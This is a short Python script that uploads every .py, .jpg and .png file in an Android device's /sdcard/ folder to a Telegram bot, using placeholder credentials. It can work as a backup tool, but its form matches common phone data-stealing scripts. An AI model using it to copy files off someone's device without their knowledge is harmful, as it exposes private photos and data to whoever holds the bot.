import os
import requests

def send_file_to_telegram(bot_token, chat_id, file_path):
    with open(file_path, 'rb') as f:
        file_data = f.read()
    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
    files = {'document': (file_path, file_data)}
    data = {'chat_id': chat_id}
    response = requests.post(url, data=data, files=files)
    return response

def send_files_in_directory(bot_token, chat_id, directory_path, extensions):
    for file in os.listdir(directory_path):
        if any(file.endswith(ext) for ext in extensions):
            file_path = os.path.join(directory_path, file)
            response = send_file_to_telegram(bot_token, chat_id, file_path)
            print(f'Sending {file}: {response.status_code}')

def main():
    bot_token = 'YOUR_BOT_TOKEN_HERE'
    chat_id = 'YOUR_CHAT_ID_HERE'
    directory_path = '/sdcard/'
    file_extensions = ['.py', '.jpg', '.png']

    send_files_in_directory(bot_token, chat_id, directory_path, file_extensions)

if __name__ == "__main__":
    main()
